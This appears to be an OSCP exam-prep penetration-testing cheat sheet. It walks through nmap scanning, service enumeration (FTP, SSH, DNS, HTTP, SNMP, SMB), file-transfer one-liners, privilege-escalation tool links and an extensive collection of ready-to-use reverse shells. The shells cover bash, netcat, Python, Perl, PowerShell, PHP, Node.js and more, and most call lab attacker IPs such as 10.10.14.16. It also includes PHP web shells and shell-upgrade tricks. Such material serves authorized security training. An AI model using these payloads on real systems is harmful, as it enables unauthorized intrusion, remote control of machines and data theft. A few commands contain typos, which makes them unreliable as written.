# OSCP

## 0) INITIAL INFO (WHAT DO WE PREVIOUSLY KNOW ABOUT THIS MACHINE)

OUTPUT: IP, OBJETIVES

## 1) PING

`nmap -v -sn {TARGET_IP}`

## 2) FAST SCAN (DETECT COMMON PORTS)

(-Pn if no ping response in step 1)

`nmap -v -F [-Pn] {TARGET_IP}`

## 3) LAUNCH FULL SCAN (10-30 MINS)

COMMAND 1 (TCP ALL PORTS) : 

`nmap -v -T4 -p1-65535 -sC -sV -O {TARGET_IP}`

COMMAND 2 (UDP 1000 MOST COMMON PORTS) : 

`nmap -v -T4 -sS -sU -sV -sC {TARGET_IP}`

## 4) ENUMERATION + VULN ANALYSIS

### FTP (21)

`nmap -v -p 21 -T5 --script=ftp-anon,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221" --script-args=unsafe=1 <[HOST IP]>`

FTP CONNECT

`Filezilla`

### SSH (22)

`nmap -p 22 -T5 -sV -sC -vv --script="ssh-auth*,ssh2*,sshv1,ssh-hostkey,ssh-publickey-acceptance" <[HOST IP]>`

SSH CONNECT

`ssh user@[IP]
ssh -i ssh.key user@[IP]
ssh -i ssh.key -6 user@[IPv6]`

### SMTP (25)

`nmap -p25 --script=smtp* <[HOST IP]>`

### DNS (53)

```nmap -sU -p 22 --script=*dns* <[HOST IP]>

 host -t ns megacorpone.com

 dnsrecon -d megacorpone.com -t axfr
 
 dnsenum megacorpone.com
```

### HTTP (80)

#### 1- VERSIONS

`==>whatweb
==>wappalyzer`

#### 2- VHOSTS

`nmap --script=http-vhosts --script-args=filelist="vhosts.txt" -p 80 <[HOST IP]>`

`VHostScan -t megacorpone.com -w ./wordlists/wordlist.txt`

#### 3- VISUAL RECON

##### LOOK FOR SQL-I, PATH TRAVERSAL, FILE UPLOAD...

#### 4- BRUTEFORCE WEB CONTENTS

```==>dirbuster

==>dirb

======================== HOTKEYS ========================
 'n' -> Go to next directory.
 'q' -> Stop scan. (Saving state for resume)
 'r' -> Remaining scan stats.

======================== OPTIONS ========================
 -a <agent_string> : Specify your custom USER_AGENT.
 -c <cookie_string> : Set a cookie for the HTTP request.
 -f : Fine tunning of NOT_FOUND (404) detection.
 -H <header_string> : Add a custom header to the HTTP request.
 -i : Use case-insensitive search.
 -l : Print "Location" header when found.
 -N <nf_code>: Ignore responses with this HTTP code.
 -o <output_file> : Save output to disk.
 -p <proxy[:port]> : Use this proxy. (Default port is 1080)
 -P <proxy_username:proxy_password> : Proxy Authentication.
 -r : Don't search recursively.
 -R : Interactive recursion. (Asks for each directory)
 -S : Silent Mode. Don't show tested words. (For dumb terminals)
 -t : Don't force an ending '/' on URLs.
 -u <username:password> : HTTP Authentication.
 -v : Show also NOT_FOUND pages.
 -w : Don't stop on WARNING messages.
 -X <extensions> / -x <exts_file> : Append each word with this extensions.
 -z <milisecs> : Add a miliseconds delay to not cause excessive Flood.
```

#### 5- SCAN TOOLS

{WEB SCAN TOOLS ALLOWED}
- NIKTO
- ALL CMS SCANNERS: wpscan, joomscan, droopscan, magescan...

{WEB SCAN TOOLS DISALLOWED}
- SQLMAP
- OWASP ZAP

### SMTP (161 UDP)

`nmap -sU --open -p161 --script=snmp* <[HOST IP]>`

`onesixtyone -c public <[HOST IP]>` -->Check string "public"

`snmpwalk -c public -v[1,2c,3] [HOST IP]` -->Extract info from string "public"

### HTTPS (443)

`nmap -sU --open -443 --script=ssl* <[HOST IP]>`

### SMB (445)

```nmap -p 445 -vv --script="smb-vuln-*,smb-enum-*" <[HOST IP]>

ENUM4LINUX
enum4linux -a <[HOST IP]>

NULL CONNECT
rpccclient -U "" <[HOST IP]>

LIST SHARES
smbclient -L <[HOST IP]> -N

CONNECT TO A SHARE
smbclient //<[HOST IP]>//share

CONNECT TO A SHARE - NO USER/PASS
smbclient //<[HOST IP]>/IPC -U ""%""

MOUNT SHARE
mount -t cifs -o user=USERNAME,sec=ntlm,dir_mode=0077 "//<[HOST IP]>/My Share" /mnt/cifs
mount -t cifs -o "//<[HOST IP]>/IPC" /mnt/cifs
```

## 5) EXPLOIT (USER 1)

searchsploit / exploit-db

metasploit

custom exploitation

## 6) POST EXPLOTATION / INTERNAL ENUM (USER 1)

### INFO GATHERING

#### LINUX
{SCRIPTS SH/PYTHON}
LINENUM
https://github.com/rebootuser/LinEnum
LINUX PRIV CHECKER
https://github.com/sleventyeleven/linuxprivchecker/
LINUX EXPLOIT SUGGESTER
https://github.com/mzet-/linux-exploit-suggester
LINUX EXPLOIT SUGGESTER 2
https://github.com/jondonas/linux-exploit-suggester-2

{MANUAL}
https://github.com/mubix/post-exploitation/wiki/Linux-Post-Exploitation-Command-List

#### WINDOWS
{SCRIPTS POWERSHELL}
POWERUP
https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc
SHERLOK
https://github.com/rasta-mouse/Sherlock
WATSON
https://github.com/rasta-mouse/Watson
JAWS
https://github.com/411Hall/JAWS
POWERLESS
https://github.com/M4ximuss/Powerless

{MANUAL}
https://medium.com/@int0x33/day-26-the-complete-list-of-windows-post-exploitation-commands-no-powershell-999b5433b61e

{METASPLOIT: SUGGESTER}

### FILE TRANSFER

(WEB SERVER ONE LINERS) https://gist.github.com/willurd/5720255

#### NC
```
1 - VICTIM
nc -l -p 1234 > out.file

2 - ATTACKER
nc [destination] 1234 < out.file
```
#### WGET
`wget 10.10.10.10/file`

#### CURL

- UPLOAD FILES
`curl -F ‘data=@path/to/local/file’ UPLOAD_ADDRESS`

- DOWNLOAD FILES
`curl https://10.10.10.10/file.txt`


#### PYTHON
`python -c "from urllib import urlretrieve; urlretrieve('http://10.10.14.16/windows/reverse.exe', 'reverse.exe')"`

#### POWERSHELL
`powershell.exe (New-Object System.Net.WebClient).DownloadFile("https://example.com/archive.zip", "C:\Windows\Temp\archive.zip")`

#### PERL
`FILE: #!/usr/bin/perl use LWP::Simple; getstore("http://domain/file", "file");`

`perl file.pl`

#### RUBY
`FILE: #!/usr/bin/ruby require 'net/http' Net::HTTP.start("www.domain.com") { |http| r = http.get("/file") open("save_location", "wb") { |file| file.write(r.body) } } `

`ruty file.rb`

#### PHP
`FILE: #!/usr/bin/php <?php $data = @file("http://example.com/file"); $lf = "local_file"; $fh = fopen($lf, 'w'); fwrite($fh, $data[0]); fclose($fh); ?>`

`php file.php`

### REVERSE SHELL

#### Bash shell TCP

`bash -i >& /dev/tcp/10.10.14.16/4499 0>&1`

`0<&196;exec 196<>/dev/tcp/10.10.14.16/4499; sh <&196 >&196 2>&196`

#### Bash shell UDP
`1 - (ATTACKER) nc -u -lvp 6699`
`2 - (VICTIM) sh -i >& /dev/udp/10.10.14.16/6699 0>&1`

#### Netcat without -e flag
`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 4443 >/tmp/f`

#### Netcat Linux
`nc -e /bin/sh 10.10.14.16 4499`

#### Netcat Linux UDP
`ncat --udp -e /bin/bash 127.0.0.1 4443`

#### Netcat Windows
`nc -e cmd.exe 10.10.10.10 4443`

#### Python
`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.16",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`

`p=subprocess.call(["/bin/sh","-i",">&","/dev/tcp/10.10.14.16/4499","0>&1"])`

#### Perl
`perl -e 'use Socket;$i="10.10.10.10";$p=4443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`

#### Ruby
`ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`

#### PowerShell
`powershell -nop -exec bypass -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.23',1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`

#### PHP
`php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'`

#### PHP FILES
`<?php echo exec($_GET["cmd"]); ?>`
`<?php system("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.16/4499 0>&1'");`
`<?php shell_exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.16/4499 0>&1'");`
`<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.16/4499 0>&1'");`

#### AWK

`awk 'BEGIN {s = "/inet/tcp/0/10.0.0.1>/4242"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null`


#### TELNET
```1 - VICTIM 
rm -f /tmp/p; mknod /tmp/p p && telnet ATTACKING-IP 80 0/tmp/p

2 - ATTACKER
telnet ATTACKING-IP 80 | /bin/bash | telnet ATTACKING-IP 443
```
#### SOCAT
`user@attack$ socat file:`tty`,raw,echo=0 TCP-L:4242`
`user@victim$ /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.10.10:4242`

#### Xterm
```
(VICTIM) 
xterm -display 10.0.0.1:1

(ATTACKER) 
1) (Start XTerm server) 
Xnest :1

2) (Authorise target)
xhost +[TARGET_IP] (Ex: xhost+10.10.14.16)
```
#### Java
```r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```
#### NODE JS
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(5599, "10.10.14.16", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();

### SPAWN A SHELL

#### BASH
```/bin/sh -i
(USING FIND) find /etc/passwd -exec /bin/bash ;
```
#### PYTHON
```python -c 'import pty; pty.spawn("/bin/sh")'
echo os.system('/bin/bash')
 ```
#### PERL
```perl -e 'exec "/bin/sh";'
perl: exec "/bin/sh";
 ```
#### RUBY
`exec "/bin/sh"`
 
#### LUA
`s.execute('/bin/sh')`
 
#### IRB
`exec "/bin/sh"`
 
#### VI
`:!bash`
`:set shell=/bin/bash:shell`
 
#### MAP
`!sh`

### UPGRADE SHELL

#### PYTHON
Enter while in reverse shell
`$ python -c 'import pty; pty.spawn("/bin/bash")'`

#### SOCAT
```
https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/#method2usingsocat
- 1 KALI: 
socat file:'tty',raw,echo=0 tcp-listen:8888

- 2 VICTIM: 
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.16:8888
```

## 7) POST EXPLOTATION / PRIVILEGE ESCALATION (USER 2)

{SEARCHSPLOIT / EXPLOIT-DB}
{METASPLOIT}

[REPEAT UNTIL...]

## N) POST EXPLOTATION / PRIVILEGE ESCALATION (USER ROOT/ADMIN)


## N+1) REPORT


--------------------------------------------------------------
